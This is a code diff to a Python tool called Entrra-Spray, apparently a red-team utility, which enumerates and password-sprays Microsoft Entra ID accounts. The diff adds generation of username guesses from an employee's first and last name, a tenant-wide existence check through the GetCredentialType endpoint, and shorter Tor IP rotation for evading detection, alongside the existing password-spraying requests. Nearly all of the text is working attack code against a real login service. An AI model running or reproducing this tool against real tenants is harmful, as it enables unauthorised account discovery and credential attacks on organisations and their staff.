@@ -7,6 +7,7 @@ from urllib.parse import unquote, urlparse, parse_qs
 import argparse
 import getpass
 import os
+import sys
 
 
 RESET = "\033[0m"
@@ -28,28 +29,73 @@ def load_list(input_str):
     else:
         return [input_str]
 
+
+def generate_combinations(firstname, lastname):
+    combinations = set()
+    f = firstname.lower()
+    l = lastname.lower()
+    combinations.add(f)
+    combinations.add(l)
+    combinations.add(f + l)
+    combinations.add(f + '.' + l)
+    combinations.add(l + '.' + f)
+    combinations.add(l + f)
+    combinations.add(f + l[0])
+    combinations.add(l + f[0])
+    combinations.add(f + l[:2])
+    combinations.add(f + l[:3])
+    combinations.add(l + f[:2])
+    combinations.add(l + f[:3])
+    combinations.add(f[0] + l[0])
+    combinations.add(l[0] + f[0])
+    combinations.add(l[0] + '.' + f)
+    combinations.add(f[0] + '.' + l)
+    combinations.add(f + '.' + l[0])
+    combinations.add(l + '.' + f[0])
+    return sorted(combinations)
+
+
+
 parser = argparse.ArgumentParser(
-    description="Spray or test Microsoft login using username(s) and password(s).",
-    epilog="Example usage:\n"
-           "python3 Entrra-Spray.py -user /home/usernames.txt | user@domain.com -pass /home/usernames.txt | 'Single-password' \n"
-           "python3 Entrra-Spray.py -user /home/usernames.txt | user@domain.com -pass /home/usernames.txt | 'Single-password' -check \n"
-           "python3 Entrra-Spray.py -user /home/usernames.txt | user@domain.com -pass /home/usernames.txt | 'Single-password' -proxytor \n",
     formatter_class=argparse.RawTextHelpFormatter
 )
 
-parser.add_argument("-user", required=True, help="Single username or path to usernames file (TXT)")
-parser.add_argument("-pass", dest="password", required=False, help="Single password or path to passwords file (TXT)")
-parser.add_argument("-check", action="store_true", help="Enable check mode (check if Identity exists in Entra - May return false positives)")
-parser.add_argument("-proxytor", action="store_true", help="Route all traffic through TOR (requires Tor service running on localhost:9050). IP will renew every 7 minutes.")
+parser.add_argument("-user", dest="user", help="Single username or path to usernames file")
+parser.add_argument("-password", dest="password", help="Single password or path to passwords file")
+parser.add_argument("-firstname", dest="firstname", help="First Name of employee")
+parser.add_argument("-lastname", dest="lastname", help="Last Name of employee")
+parser.add_argument("-tenantname", dest="tenantname", help="Tenant domain name")
+parser.add_argument("-check", action="store_true", help="Enable check mode (check if identity exists in Entra - may return false positives)")
+parser.add_argument("-proxytor", action="store_true", help="Route all traffic through TOR (requires Tor service running on localhost:9050). IP will renew every 4 minutes.")
 
 args = parser.parse_args()
 
-usernames = load_list(args.user)
+if len(sys.argv) == 1:
+    print("""
+Cool Tool For Enumeration and Validation User Accounts in Entra ID :]
+        Red Team - Ab-Inbev
+        Author - Shaked Wiessman
+
+    python3 Entrra-Spray.py -user /home/usernames.txt | singleusername@domain.com -password /home/passwords.txt | SingleP@SSSw0rd -check
+    python3 Entrra-Spray.py -user /home/usernames.txt | singleusername@domain.com -password /home/passwords.txt | SingleP@SSSw0rd -check -proxytor
+    python3 Entrra-Spray.py -firstname Anheuser -lastname Busch -tenantname ab-inbev.com
+    python3 Entrra-Spray.py -firstname Anheuser -lastname Busch -tenantname ab-inbev.com -proxytor
+
+""")
+    parser.print_help()
+    sys.exit(0)
+
+
+if args.user:
+    usernames = load_list(args.user)
+    
 if args.password:
     passwords = load_list(args.password)
-    
-proxies = None
 
+if args.firstname and args.lastname:
+    combos = generate_combinations(args.firstname, args.lastname)
+
+proxies = None
 
 def get_tor_ip():
     try:
@@ -74,7 +120,7 @@ def renew_tor_ip():
 transport = None
 if args.proxytor:
     last_ip_renewal = time.time()
-    renew_interval = 300
+    renew_interval = 240
     proxies = "socks5h://127.0.0.1:9050"
     transport = httpx.HTTPTransport(proxy=proxies)
     get_tor_ip()  
@@ -83,13 +129,379 @@ if args.proxytor:
 with open("valid-users.txt", "w") as f:
     pass
 
-#New Checking for user validation only
-if args.password is None:
+
+
+########################################################################################################################
+
+# Combination With First Name and Last Name with and with out Tor Proxy:
+if args.firstname and args.lastname and args.tenantname and args.user is None and args.password is None:
+    for username_combo in combos:
+        username = f"{username_combo}@{args.tenantname}"
+        
+        # Proxt Tor Combination chekcing:
+        if args.proxytor and transport and time.time() - last_ip_renewal >= renew_interval:
+            renew_tor_ip()
+        
+            # Reques 1 a For getting cookies (With Tor Proxy) :] 
+            url_login = "https://login.microsoftonline.com/"
+            headers_login = {
+                "Host": "login.microsoftonline.com",
+                "Sec-Ch-Ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
+                "Sec-Ch-Ua-Mobile": "?0",
+                "Sec-Ch-Ua-Platform": '"Windows"',
+                "Accept-Language": "en-US,en;q=0.9",
+                "Upgrade-Insecure-Requests": "1",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
+                "Sec-Purpose": "prefetch;prerender",
+                "Purpose": "prefetch",
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+                "Sec-Fetch-Site": "none",
+                "Sec-Fetch-Mode": "navigate",
+                "Sec-Fetch-User": "?1",
+                "Sec-Fetch-Dest": "document",
+                "Accept-Encoding": "gzip, deflate, br",
+                "Priority": "u=0, i",
+            }
+
+            try:
+                with httpx.Client(transport=transport, timeout=20, http2=True, headers=headers_login, follow_redirects=False) as client:
+                    response_login = client.get(url_login)
+                    cookies_dict_login = dict(response_login.cookies)
+                    cookies_list_login = [{"name": name, "value": value} for name, value in cookies_dict_login.items()]
+                    for i, cookie_login in enumerate(cookies_list_login[:4], 1):  
+                            globals()[f"cookie_login{i}"] = cookie_login  
+            
+                for i in range(1, 5):
+                    var_name = f"cookie_login{i}"
+                    if var_name in globals():
+                        cookie_login = globals()[var_name]
+                    else:
+                        print(f"{var_name}: not found")
+            
+            except httpx.ReadTimeout:
+                print(f"{BOLD_RED}[✗] Timeout occurred while connecting to {url_login}{RESET}")
+            except httpx.RequestError as e:
+                print(f"{BOLD_RED}[✗] Request error: {e}{RESET}")
+            except Exception:
+                print(f"{BOLD_RED}[✗] Unexpected error occurred while connecting to {url_login}{RESET}")
+               
+
+            # Reques 2 a For getting two urls: (With Tor Proxy) :]      
+            url_geturls = "https://www.office.com/login"
+            headers_geturls = {
+                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
+                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+            }
+                
+            try: 
+                with httpx.Client(transport=transport, timeout=20, follow_redirects=False, http2=True, headers=headers_geturls) as client:                   
+                    response_geturls = client.get(url_geturls)
+                    location = response_geturls.headers.get("location")
+                    if not location:
+                        raise Exception("Redirect Location header not found")
+                                    
+                url1 = location + "&sso_reload=true"
+                url2 = location
+                            
+                cookie_header = ""
+                for i in range(1, 20):  
+                    var_name = f"cookie_login{i}"
+                    if var_name in globals():
+                        ck = globals()[var_name]
+                        cookie_header += f"{ck['name']}={ck['value']}; "
+            
+                cookie_header = cookie_header.strip().rstrip(";")
+            
+            except httpx.ReadTimeout:
+                print(f"{BOLD_RED}[✗] Timeout occurred while connecting to {url_geturls}{RESET}")
+            except httpx.RequestError as e:
+                print(f"{BOLD_RED}[✗] Request error: {e}{RESET}")
+            except Exception:
+                print(f"{BOLD_RED}[✗] Unexpected error occurred while connecting to {url_geturls} {RESET}")
+
+
+            # Reques 3 a For getting flowtoken parameter: (With Tor Proxy) :]      
+            headers_ulrs = {
+                "Host": "login.microsoftonline.com",
+                "Cookie": cookie_header,
+                "Accept-Language": "en-US,en;q=0.9",
+                "Upgrade-Insecure-Requests": "1",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+                "Sec-Fetch-Site": "none",
+                "Sec-Fetch-Mode": "navigate",
+                "Sec-Fetch-User": "?1",
+                "Sec-Fetch-Dest": "document",
+                "Sec-Ch-Ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
+                "Sec-Ch-Ua-Mobile": "?0",
+                "Sec-Ch-Ua-Platform": '"Windows"',
+                "Accept-Encoding": "gzip, deflate, br",
+                "Priority": "u=0, i"
+            }
+            
+            try: 
+                with httpx.Client(transport=transport, timeout=20, http2=True, headers=headers_ulrs, follow_redirects=False) as client:
+                    response2 = client.get(url1)
+                    cookies_dict2 = dict(response2.cookies)
+                    cookies_list2 = [{"name": name, "value": value} for name, value in cookies_dict2.items()]
+                    for i, cookie2 in enumerate(cookies_list2[:6], 1):  
+                        globals()[f"cookie_url1{i}"] = cookie2
+
+                html = response2.text.replace("\\u0026", "&")
+                match_reset = re.search(r'https://passwordreset\.microsoftonline\.com/\?ru=[^"\'>]+', html, re.IGNORECASE)
+                if not match_reset:
+                    raise Exception("Reset URL not found")
+                                
+                decoded_reset = unquote(match_reset.group())
+                inner_url = decoded_reset.split("ru=", 1)[-1]
+                
+                match_flow = re.search(r'"sFT"\s*:\s*"([^"]+)"', html, re.IGNORECASE | re.DOTALL)
+                flowtoken = match_flow.group(1) if match_flow else None
+
+            except httpx.ReadTimeout:
+                print(f"{BOLD_RED}[✗] Timeout occurred while connecting to {url1} and {url2}{RESET}")
+            except httpx.RequestError as e:
+                print(f"{BOLD_RED}[✗] Request error: {e}{RESET}")
+            except Exception:
+                print(f"{BOLD_RED}[✗] Unexpected error occurred while connecting to {url1} and {url2} {RESET}")
+
+
+            # Reques 4 Checking if user is exsit: (With Tor Proxy) :] 
+            url_UserExsit = "https://login.microsoftonline.com/common/GetCredentialType"
+            headers_UserExsit = {
+                "Host": "login.microsoftonline.com",
+                "Sec-Ch-Ua-Platform": '"Windows"',
+                "Hpgid": "1104",
+                "Accept-Language": "en-US,en;q=0.9",
+                "Sec-Ch-Ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
+                "Hpgact": "1800",
+                "Sec-Ch-Ua-Mobile": "?0",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
+                "Accept": "application/json",
+                "Hpgrequestid": "79994791-4414-40de-9014-ef5533da1700",
+                "Content-Type": "application/json; charset=UTF-8",
+                "Origin": "https://login.microsoftonline.com",
+                "Sec-Fetch-Site": "same-origin",
+                "Sec-Fetch-Mode": "cors",
+                "Accept-Encoding": "gzip, deflate, br",
+                "Priority": "u=1, i"
+            }
+            
+            payload_UserExsit = {
+                "username": f"{username}",
+                "flowToken": f"{flowtoken}"
+            }
+                
+            try:
+                with httpx.Client(transport=transport, timeout=20, http2=True ) as client:
+                    response_UserExsit = client.post(url_UserExsit, headers=headers_UserExsit, json=payload_UserExsit)
+                    if '"FederationRedirectUrl"' in response_UserExsit.text:
+                        print(f"{BACKGROUNG_YELLOW}[!] Can not enumeration if username is exist {RESET}")
+                        continue
+                    if '"IfExistsResult":0' in response_UserExsit.text:
+                        print(f"{BOLD_GREEN}[✗] Username: {username} is exists{RESET}")
+                        with open("valid-users.txt", "a") as log_file:
+                            log_file.write(f"{username}\n")
+                        break
+                    else:
+                        print(f"{BOLD_RED}[✗] Username: {username} not exists{RESET}")
+                        continue
+                                            
+                    
+            except httpx.ReadTimeout:
+                print(f"{BOLD_RED}[✗] Timeout occurred while connecting to {url_UserExsit}{RESET}")
+            except httpx.RequestError as e:
+                print(f"{BOLD_RED}[✗] Request error: {e}{RESET}")
+            except Exception:
+                print(f"{BOLD_RED}[✗] Unexpected error occurred while connecting to {url_UserExsit}{RESET}")
+
+        # Proxt Tor Combination chekcing:
+        else: 
+            # Reques 1 a For getting cookies (With-out Tor Proxy) :]
+            url_login = "https://login.microsoftonline.com/"
+            headers_login = {
+                "Host": "login.microsoftonline.com",
+                "Sec-Ch-Ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
+                "Sec-Ch-Ua-Mobile": "?0",
+                "Sec-Ch-Ua-Platform": '"Windows"',
+                "Accept-Language": "en-US,en;q=0.9",
+                "Upgrade-Insecure-Requests": "1",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
+                "Sec-Purpose": "prefetch;prerender",
+                "Purpose": "prefetch",
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+                "Sec-Fetch-Site": "none",
+                "Sec-Fetch-Mode": "navigate",
+                "Sec-Fetch-User": "?1",
+                "Sec-Fetch-Dest": "document",
+                "Accept-Encoding": "gzip, deflate, br",
+                "Priority": "u=0, i",
+            }
+
+            try:
+                with httpx.Client(timeout=20, http2=True, headers=headers_login, follow_redirects=False) as client:
+                    response_login = client.get(url_login)
+                    cookies_dict_login = dict(response_login.cookies)
+                    cookies_list_login = [{"name": name, "value": value} for name, value in cookies_dict_login.items()]
+                    for i, cookie_login in enumerate(cookies_list_login[:4], 1):  
+                            globals()[f"cookie_login{i}"] = cookie_login  
+            
+                for i in range(1, 5):
+                    var_name = f"cookie_login{i}"
+                    if var_name in globals():
+                        cookie_login = globals()[var_name]
+                    else:
+                        print(f"{var_name}: not found")
+            
+            except httpx.ReadTimeout:
+                print(f"{BOLD_RED}[✗] Timeout occurred while connecting to {url_login}{RESET}")
+            except httpx.RequestError as e:
+                print(f"{BOLD_RED}[✗] Request error: {e}{RESET}")
+            except Exception:
+                print(f"{BOLD_RED}[✗] Unexpected error occurred while connecting to {url_login}{RESET}")
+               
+               
+               
+            # Reques 2 a For getting two urls: (With-out Tor Proxy) :] 
+            url_geturls = "https://www.office.com/login"
+            headers_geturls = {
+                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
+                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+            }
+                
+            try: 
+                with httpx.Client(timeout=20, follow_redirects=False, http2=True, headers=headers_geturls) as client:                   
+                    response_geturls = client.get(url_geturls)
+                    location = response_geturls.headers.get("location")
+                    if not location:
+                        raise Exception("Redirect Location header not found")
+                                    
+                url1 = location + "&sso_reload=true"
+                url2 = location
+                            
+                cookie_header = ""
+                for i in range(1, 20):  
+                    var_name = f"cookie_login{i}"
+                    if var_name in globals():
+                        ck = globals()[var_name]
+                        cookie_header += f"{ck['name']}={ck['value']}; "
+            
+                cookie_header = cookie_header.strip().rstrip(";")
+            
+            except httpx.ReadTimeout:
+                print(f"{BOLD_RED}[✗] Timeout occurred while connecting to {url_geturls}{RESET}")
+            except httpx.RequestError as e:
+                print(f"{BOLD_RED}[✗] Request error: {e}{RESET}")
+            except Exception:
+                print(f"{BOLD_RED}[✗] Unexpected error occurred while connecting to {url_geturls} {RESET}")
+
+ 
+            # Reques 3 a For getting flowtoken parameter: (With-out Tor Proxy) :]
+            headers_ulrs = {
+                "Host": "login.microsoftonline.com",
+                "Cookie": cookie_header,
+                "Accept-Language": "en-US,en;q=0.9",
+                "Upgrade-Insecure-Requests": "1",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+                "Sec-Fetch-Site": "none",
+                "Sec-Fetch-Mode": "navigate",
+                "Sec-Fetch-User": "?1",
+                "Sec-Fetch-Dest": "document",
+                "Sec-Ch-Ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
+                "Sec-Ch-Ua-Mobile": "?0",
+                "Sec-Ch-Ua-Platform": '"Windows"',
+                "Accept-Encoding": "gzip, deflate, br",
+                "Priority": "u=0, i"
+            }
+            
+            try: 
+                with httpx.Client(timeout=20, http2=True, headers=headers_ulrs, follow_redirects=False) as client:
+                    response2 = client.get(url1)
+                    cookies_dict2 = dict(response2.cookies)
+                    cookies_list2 = [{"name": name, "value": value} for name, value in cookies_dict2.items()]
+                    for i, cookie2 in enumerate(cookies_list2[:6], 1):  
+                        globals()[f"cookie_url1{i}"] = cookie2
+
+                html = response2.text.replace("\\u0026", "&")
+                match_reset = re.search(r'https://passwordreset\.microsoftonline\.com/\?ru=[^"\'>]+', html, re.IGNORECASE)
+                if not match_reset:
+                    raise Exception("Reset URL not found")
+                                
+                decoded_reset = unquote(match_reset.group())
+                inner_url = decoded_reset.split("ru=", 1)[-1]
+                
+                match_flow = re.search(r'"sFT"\s*:\s*"([^"]+)"', html, re.IGNORECASE | re.DOTALL)
+                flowtoken = match_flow.group(1) if match_flow else None
+
+            except httpx.ReadTimeout:
+                print(f"{BOLD_RED}[✗] Timeout occurred while connecting to {url1} and {url2}{RESET}")
+            except httpx.RequestError as e:
+                print(f"{BOLD_RED}[✗] Request error: {e}{RESET}")
+            except Exception:
+                print(f"{BOLD_RED}[✗] Unexpected error occurred while connecting to {url1} and {url2} {RESET}")
+
+
+            # Reques 4 Checking if user is exsit: (With-out Tor Proxy) :] 
+            url_UserExsit = "https://login.microsoftonline.com/common/GetCredentialType"
+            headers_UserExsit = {
+                "Host": "login.microsoftonline.com",
+                "Sec-Ch-Ua-Platform": '"Windows"',
+                "Hpgid": "1104",
+                "Accept-Language": "en-US,en;q=0.9",
+                "Sec-Ch-Ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
+                "Hpgact": "1800",
+                "Sec-Ch-Ua-Mobile": "?0",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
+                "Accept": "application/json",
+                "Hpgrequestid": "79994791-4414-40de-9014-ef5533da1700",
+                "Content-Type": "application/json; charset=UTF-8",
+                "Origin": "https://login.microsoftonline.com",
+                "Sec-Fetch-Site": "same-origin",
+                "Sec-Fetch-Mode": "cors",
+                "Accept-Encoding": "gzip, deflate, br",
+                "Priority": "u=1, i"
+            }
+            
+            payload_UserExsit = {
+                "username": f"{username}",
+                "flowToken": f"{flowtoken}"
+            }
+                
+            try:
+                with httpx.Client(timeout=20, http2=True ) as client:
+                    response_UserExsit = client.post(url_UserExsit, headers=headers_UserExsit, json=payload_UserExsit)
+                    if '"FederationRedirectUrl"' in response_UserExsit.text:
+                        print(f"{BACKGROUNG_YELLOW}[!] Can not enumeration if username is exist {RESET}")
+                        continue
+                    if '"IfExistsResult":0' in response_UserExsit.text:
+                        print(f"{BOLD_GREEN}[✗] Username: {username} is exists{RESET}")
+                        with open("valid-users.txt", "a") as log_file:
+                            log_file.write(f"{username}\n")
+                        break
+                    else:
+                        print(f"{BOLD_RED}[✗] Username: {username} not exists{RESET}")
+                        continue        
+                    
+            except httpx.ReadTimeout:
+                print(f"{BOLD_RED}[✗] Timeout occurred while connecting to {url_UserExsit}{RESET}")
+            except httpx.RequestError as e:
+                print(f"{BOLD_RED}[✗] Request error: {e}{RESET}")
+            except Exception:
+                print(f"{BOLD_RED}[✗] Unexpected error occurred while connecting to {url_UserExsit}{RESET}")
+
+
+
+
+
+#New Function of Checking vaild user account
+
+if args.user and args.check and args.password is None and args.firstname is None and args.lastname is None and args.tenantname is None:
     for username in usernames:
         if args.proxytor and transport and time.time() - last_ip_renewal >= renew_interval:
             renew_tor_ip()
             
-
+            # Reques 1 a For getting cookies (With Tor Proxy) :]          
             url_login = "https://login.microsoftonline.com/"
             headers_login = {
                 "Host": "login.microsoftonline.com",
@@ -133,9 +545,8 @@ if args.password is None:
             except Exception:
                 print(f"{BOLD_RED}[✗] Unexpected error occurred while connecting to {url_login}{RESET}")
                 
-                
-                #Sec action - Getting 2 urls (with proxy):
-    
+
+            # Reques 2 a For getting two urls: (With Tor Proxy) :] 
             url_geturls = "https://www.office.com/login"
             headers_geturls = {
                     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
@@ -168,7 +579,7 @@ if args.password is None:
                 print(f"{BOLD_RED}[✗] Unexpected error occurred while connecting to {url_geturls} {RESET}")
     
     
-                #third action - Getting Cookies and Body Parametrs from url1+url2 (with proxy):
+            # Reques 3 a For getting flowtoken parameter: (With Tor Proxy) :]
             headers_ulrs = {
                 "Host": "login.microsoftonline.com",
                 "Cookie": cookie_header,
@@ -227,7 +638,7 @@ if args.password is None:
                 print(f"{BOLD_RED}[✗] Unexpected error occurred while connecting to {url1} and {url2} {RESET}")
                 
                 
-                #Check id User Exist (with proxy):
+            # Reques 4 Checking if user is exsit: (With Tor Proxy) :]
             url_UserExsit = "https://login.microsoftonline.com/common/GetCredentialType"
             headers_UserExsit = {
                 "Host": "login.microsoftonline.com",
@@ -285,6 +696,8 @@ if args.password is None:
                 print(f"{BOLD_RED}[✗] Unexpected error occurred while connecting to {url_UserExsit}{RESET}")
                     
         else:
+            
+            # Reques 1 a For getting cookies (With-out Tor Proxy) :]
             url_login = "https://login.microsoftonline.com/"
             headers_login = {
                 "Host": "login.microsoftonline.com",
@@ -328,8 +741,8 @@ if args.password is None:
             except Exception:
                 print(f"{BOLD_RED}[✗] Unexpected error occurred while connecting to {url_login}{RESET}")
                 
-                
-   
+
+            # Reques 2 a For getting two urls: (With-out Tor Proxy) :] 
             url_geturls = "https://www.office.com/login"
             headers_geturls = {
                     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
@@ -361,8 +774,8 @@ if args.password is None:
             except Exception:
                 print(f"{BOLD_RED}[✗] Unexpected error occurred while connecting to {url_geturls} {RESET}")
     
-    
-
+ 
+            # Reques 3 a For getting flowtoken parameter: (With-out Tor Proxy) :]
             headers_ulrs = {
                 "Host": "login.microsoftonline.com",
                 "Cookie": cookie_header,
@@ -421,7 +834,7 @@ if args.password is None:
                 print(f"{BOLD_RED}[✗] Unexpected error occurred while connecting to {url1} and {url2} {RESET}")
                 
                 
-                #Check id User Exist (with proxy):
+            # Reques 4 Checking if user is exsit: (With-out Tor Proxy) :]
             url_UserExsit = "https://login.microsoftonline.com/common/GetCredentialType"
             headers_UserExsit = {
                 "Host": "login.microsoftonline.com",
@@ -488,8 +901,7 @@ if args.password:
                 renew_tor_ip()
                 
                 
-                #first action - login (with proxy):
-                
+            # Reques 1 a For getting cookies (With Tor Proxy) :]             
                 url_login = "https://login.microsoftonline.com/"
                 headers_login = {
                     "Host": "login.microsoftonline.com",
@@ -533,9 +945,8 @@ if args.password:
                 except Exception:
                     print(f"{BOLD_RED}[✗] Unexpected error occurred while connecting to {url_login}{RESET}")
                 
-                
-                #Sec action - Getting 2 urls (with proxy):
-    
+
+            # Reques 2 a For getting two urls: (With Tor Proxy) :] 
                 url_geturls = "https://www.office.com/login"
                 headers_geturls = {
                     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
@@ -568,7 +979,7 @@ if args.password:
                     print(f"{BOLD_RED}[✗] Unexpected error occurred while connecting to {url_geturls} {RESET}")
     
     
-                #third action - Getting Cookies and Body Parametrs from url1+url2 (with proxy):
+            # Reques 3 a For getting flowtoken parameter: (With Tor Proxy) :]
                 headers_ulrs = {
                     "Host": "login.microsoftonline.com",
                     "Cookie": cookie_header,
@@ -627,7 +1038,8 @@ if args.password:
                     print(f"{BOLD_RED}[✗] Unexpected error occurred while connecting to {url1} and {url2} {RESET}")
                 
                 
-                #Check id User Exist (with proxy):
+
+                # Reques 4 Checking if user is exsit: (With Tor Proxy) :]
                 url_UserExsit = "https://login.microsoftonline.com/common/GetCredentialType"
                 headers_UserExsit = {
                     "Host": "login.microsoftonline.com",
@@ -682,7 +1094,7 @@ if args.password:
                     print(f"{BOLD_RED}[✗] Unexpected error occurred while connecting to {url_UserExsit}{RESET}")
                     
                 
-                 #Final Request - POST with username and password (with proxy):
+                # Reques 5 Dor checing Username with Password (With Tor Proxy) :]
                 url_check_password = "https://login.microsoftonline.com/common/login"
                 headers_check_password = {
                     "Host": "login.microsoftonline.com",
@@ -1045,6 +1457,8 @@ if args.password:
                     print(f"{BOLD_RED}[✗] Request error: {e}{RESET}")
                 except Exception:
                     print(f"{BOLD_RED}[✗] Unexpected error occurred while connecting to {url_check_password} {RESET}")
+
+
 
 print("")
 print("")           
